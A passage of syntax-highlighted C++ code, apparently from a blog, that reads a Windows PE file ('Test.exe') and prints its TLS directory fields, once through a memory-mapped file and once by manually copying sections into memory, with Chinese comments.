class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_1</span><span class="params">()</span></span>;  <span class="comment">//文件粒度</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_2</span><span class="params">()</span></span>;  <span class="comment">//内存粒度</span></span><br><span class="line"><span class="function">BOOL <span class="title">RtlImageDirectoryEntryToData</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, <span class="type">int</span> DirectoryIndex, PIMAGE_DATA_DIRECTORY ImageDataDirectory)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">Rva2Offset</span><span class="params">(DWORD Rva, UINT_PTR ImageBaseAddress)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsOptionalHeaderPE32Plus</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, BOOL* IsWow64)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader,</span></span></span><br><span class="line"><span class="params"><span class="function">LPBYTE ImageBase, DWORD Offset)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory2</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, LPBYTE ImageBase, DWORD VirtualAddress)</span></span>;</span><br><span class="line"><span class="function">LONGLONG <span class="title">AlignmentData</span><span class="params">(LONGLONG OperateLength, LONGLONG AlignmentLength)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPEFile</span><span class="params">(LPVOID ImageBase, PIMAGE_NT_HEADERS&amp; ImageNtHeaders)</span></span>;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[],TCHAR *envp[])</span><br><span class="line">&#123;</span><br><span class="line">     <span class="built_in">setlocale</span>(LC_ALL,<span class="string">&quot;Chinese-simplified&quot;</span>);</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> <span class="built_in">Sub_1</span>();  <span class="comment">//内存映射的方法分析TLS目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="built_in">Sub_2</span>();  <span class="comment">//文件读写的方法分析TLS目录</span></span><br><span class="line"> </span><br><span class="line"> _tprintf(_T(<span class="string">&quot;Input AnyKey To Exit\r\n&quot;</span>));</span><br><span class="line">    _gettchar();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR ImageName[MAX_PATH] = _T(<span class="string">&quot;Test.exe&quot;</span>);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ImageName: %s \n&quot;</span>), ImageName);</span><br><span class="line"></span><br><span class="line">HANDLE FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE MappingHandle = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD  Offset = <span class="number">0</span>;</span><br><span class="line">IMAGE_DATA_DIRECTORY ImageDataDirectory = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件并将其映射到内存中</span></span><br><span class="line">FileHandle = <span class="built_in">CreateFile</span>(ImageName, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据文件句柄创建内存映射对象获得内存映射句柄</span></span><br><span class="line">MappingHandle = <span class="built_in">CreateFileMapping</span>(FileHandle, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (MappingHandle == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateFileMapping() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageBase = <span class="built_in">MapViewOfFile</span>(MappingHandle, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);     <span class="comment">//文件粒度对齐   </span></span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;MapViewOfFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//是否为有效的PE可执行文件</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsPEFile</span>(ImageBase, ImageNtHeaders))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;IsPEFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查看TLS目录</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">RtlImageDirectoryEntryToData</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, IMAGE_DIRECTORY_ENTRY_TLS,&amp;ImageDataDirectory))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetTlsDirectoryRVA() Error\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将内存粒度转换成文件粒度</span></span><br><span class="line">Offset = <span class="built_in">Rva2Offset</span>(ImageDataDirectory.VirtualAddress, (UINT_PTR)ImageBase);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Offset&lt;=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Rva2Offset() Error\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//显示TLS目录信息</span></span><br><span class="line"><span class="built_in">DumpTlsDirectory</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, (LPBYTE)ImageBase, Offset);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line"><span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnmapViewOfFile</span>(ImageBase);</span><br><span class="line">ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (MappingHandle != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(MappingHandle);</span><br><span class="line">MappingHandle = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(FileHandle);</span><br><span class="line">FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">&#125;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Please Input Anykey to Continue\r\n&quot;</span>));</span><br><span class="line">_gettchar();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPEFile</span><span class="params">(LPVOID ImageBase, PIMAGE_NT_HEADERS&amp; ImageNtHeaders)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line"><span class="keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">ImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ImageDosHeader + (DWORD_PTR)ImageDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">RtlImageDirectoryEntryToData</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader,<span class="type">int</span> DirectoryIndex,PIMAGE_DATA_DIRECTORY ImageDataDirectory)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64==FALSE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">PIMAGE_OPTIONAL_HEADER64 ImageOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)ImageOptionalHeader;</span><br><span class="line"><span class="built_in">memcpy</span>(ImageDataDirectory, &amp;ImageOptionalHeader64-&gt;DataDirectory[DirectoryIndex], <span class="built_in">sizeof</span>(IMAGE_DATA_DIRECTORY));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 ImageOptionalHeader32 = (PIMAGE_OPTIONAL_HEADER32)ImageOptionalHeader;</span><br><span class="line"><span class="built_in">memcpy</span>(ImageDataDirectory, &amp;ImageOptionalHeader32-&gt;DataDirectory[DirectoryIndex], <span class="built_in">sizeof</span>(IMAGE_DATA_DIRECTORY));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ImageDataDirectory-&gt;VirtualAddress == <span class="number">0</span>) &amp;&amp; (ImageDataDirectory-&gt;Size == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//这个目录不存在</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((ImageDataDirectory-&gt;VirtualAddress == <span class="number">0</span>) || (ImageDataDirectory-&gt;Size == <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//数据目录中的数据不一致</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageDataDirectory-&gt;Size &lt; (IsWow64 ? <span class="built_in">sizeof</span>(IMAGE_TLS_DIRECTORY32) : <span class="built_in">sizeof</span>(IMAGE_TLS_DIRECTORY64)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//查看目录大小是否合理</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">Rva2Offset</span><span class="params">(DWORD Rva, UINT_PTR ImageBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">WORD i = <span class="number">0</span>;</span><br><span class="line">WORD NumberOfSections = <span class="number">0</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(ImageBaseAddress + ((PIMAGE_DOS_HEADER)ImageBaseAddress)-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (ImageNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) <span class="comment">// PE32</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_NT_HEADERS32 ImageNtHeaders32 = (PIMAGE_NT_HEADERS32)ImageNtHeaders;</span><br><span class="line"></span><br><span class="line">ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;ImageNtHeaders32-&gt;OptionalHeader) + ImageNtHeaders32-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">NumberOfSections = ImageNtHeaders32-&gt;FileHeader.NumberOfSections;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) <span class="comment">// PE64</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_NT_HEADERS64 ImageNtHeaders64 = (PIMAGE_NT_HEADERS64)ImageNtHeaders;</span><br><span class="line">ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;ImageNtHeaders64-&gt;OptionalHeader) + ImageNtHeaders64-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">NumberOfSections = ImageNtHeaders64-&gt;FileHeader.NumberOfSections;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &lt; ImageSectionHeader[<span class="number">0</span>].PointerToRawData)</span><br><span class="line"><span class="keyword">return</span> Rva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= ImageSectionHeader[i].VirtualAddress &amp;&amp; Rva &lt; (ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].SizeOfRawData))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (Rva - ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].PointerToRawData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsOptionalHeaderPE32Plus</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, BOOL* IsWow64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//#define IMAGE_ROM_OPTIONAL_HDR_MAGIC   0x107ROM映像不处理</span></span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader-&gt;Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// PE32 </span></span><br><span class="line">*IsWow64 = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageOptionalHeader-&gt;Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// PE64</span></span><br><span class="line">*IsWow64 = FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 无法判断 返回失败</span></span><br><span class="line">*IsWow64 = FALSE;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DumpTlsDirectory</span><span class="params">(PIMAGE_OPTIONAL_HEADER ImageOptionalHeader, </span></span></span><br><span class="line"><span class="params"><span class="function">LPBYTE ImageBase, DWORD Offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL IsWow64 = FALSE;</span><br><span class="line"><span class="comment">//判断PE文件的位数</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsOptionalHeaderPE32Plus</span>(ImageOptionalHeader, &amp;IsWow64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsWow64 == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//x64</span></span><br><span class="line">PIMAGE_TLS_DIRECTORY64 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY64)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_TLS_DIRECTORY32 ImageTlsDirectory = (PIMAGE_TLS_DIRECTORY32)((DWORD_PTR)ImageBase + (DWORD_PTR)Offset);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;StartAddressOfRawData: %p  \r\nEndAddressOfRawData: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;StartAddressOfRawData, ImageTlsDirectory-&gt;EndAddressOfRawData);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;AddressOfIndex: %p \r\nAddressOfCallBacks:%p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;AddressOfIndex, ImageTlsDirectory-&gt;AddressOfCallBacks);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfZeroFill: %u \r\nCharacteristics: %p \r\n&quot;</span>),</span><br><span class="line">ImageTlsDirectory-&gt;SizeOfZeroFill, ImageTlsDirectory-&gt;Characteristics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存对齐</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR ImageName[MAX_PATH] = _T(<span class="string">&quot;Test.exe&quot;</span>);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ImageName: %s \r\n&quot;</span>), ImageName);</span><br><span class="line"></span><br><span class="line">HANDLE FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">LPVOID v1 = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD FileLength = <span class="number">-1</span>;</span><br><span class="line">DWORD ReturnLength = <span class="number">-1</span>;</span><br><span class="line">DWORD NumberOfSections = <span class="number">-1</span>;</span><br><span class="line">DWORD ImageSize = <span class="number">-1</span>;</span><br><span class="line">DWORD SizeOfImage = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMAGE_DATA_DIRECTORY ImageDataDirectory = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将整个文件内容读取到内存中      </span></span><br><span class="line">FileHandle = <span class="built_in">CreateFile</span>(ImageName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">FileLength = <span class="built_in">GetFileSize</span>(FileHandle, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//FileSize = 67072</span></span><br><span class="line"><span class="keyword">if</span> (FileLength == INVALID_FILE_SIZE)<span class="comment">//#define INVALID_FILE_SIZE ((DWORD)0xFFFFFFFF)</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetFileSize() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">v1 = <span class="built_in">GlobalAlloc</span>(GMEM_FIXED | GMEM_ZEROINIT, FileLength);</span><br><span class="line"><span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GlobalAlloc() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(FileHandle, v1, FileLength, &amp;ReturnLength, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ReadFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileLength != ReturnLength)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//FileSize = 67072</span></span><br><span class="line"><span class="comment">//RealReadSize = 67072</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;ReadFile() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得Nt头地址            </span></span><br><span class="line">ImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)v1 + ((PIMAGE_DOS_HEADER)v1)-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得节表起始地址</span></span><br><span class="line">ImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)&amp;ImageNtHeaders-&gt;OptionalHeader +</span><br><span class="line">(DWORD_PTR)ImageNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得PE文件中节的个数           </span></span><br><span class="line">NumberOfSections = ImageNtHeaders-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="comment">//NumberOfSections = 11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最后一个节的RVA 加上 该节数据相对内存对齐粒度对齐后的值 -&gt; 该PE文件加载到内存后所占内存的总大小     </span></span><br><span class="line">ImageSize = ImageSectionHeader[NumberOfSections - <span class="number">1</span>].VirtualAddress +</span><br><span class="line"><span class="built_in">AlignmentData</span>(ImageSectionHeader[NumberOfSections - <span class="number">1</span>].SizeOfRawData, ImageNtHeaders-&gt;OptionalHeader.SectionAlignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ImageOptionalHeader的成员SizeOfImage 内存中PE文件的总大小(必须保证内存对齐)  </span></span><br><span class="line">SizeOfImage = <span class="built_in">AlignmentData</span>(ImageNtHeaders-&gt;OptionalHeader.SizeOfImage,</span><br><span class="line">ImageNtHeaders-&gt;OptionalHeader.SectionAlignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通常以上两种方法得到的两个值是相等的,如果不等则取较大的一个       </span></span><br><span class="line"><span class="keyword">if</span> (SizeOfImage &lt; ImageSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ImageSize = 163840</span></span><br><span class="line"><span class="comment">//CalculateImageSize = 163840</span></span><br><span class="line">SizeOfImage = ImageSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配内存空间,并将其全部初始化为0          </span></span><br><span class="line">ImageBase = <span class="built_in">GlobalAlloc</span>(GMEM_FIXED | GMEM_ZEROINIT, ImageSize);</span><br><span class="line"><span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GlobalAlloc() Error:%d \r\n&quot;</span>), <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将 头+节表 复制到申请的内存中        </span></span><br><span class="line"><span class="built_in">memcpy</span>(ImageBase, v1, ImageNtHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将各个节数据复制到内存中          </span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>((PBYTE)ImageBase + ImageSectionHeader[i].VirtualAddress,<span class="comment">//节在内存中的起始处(目标)               </span></span><br><span class="line">(PBYTE)v1 + ImageSectionHeader[i].PointerToRawData,<span class="comment">//节在文件中的起始处(源数据)                     </span></span><br><span class="line">ImageSectionHeader[i].SizeOfRawData);<span class="comment">//节数据的大小</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查找TLS目录的RVA和大小</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">RtlImageDirectoryEntryToData</span>(&amp;ImageNtHeaders-&gt;OptionalHeader, IMAGE_DIRECTORY_ENTRY_TLS,</span><br><span class="line">&amp;ImageDataDirectory))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetTlsDirectoryRVA() Error\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 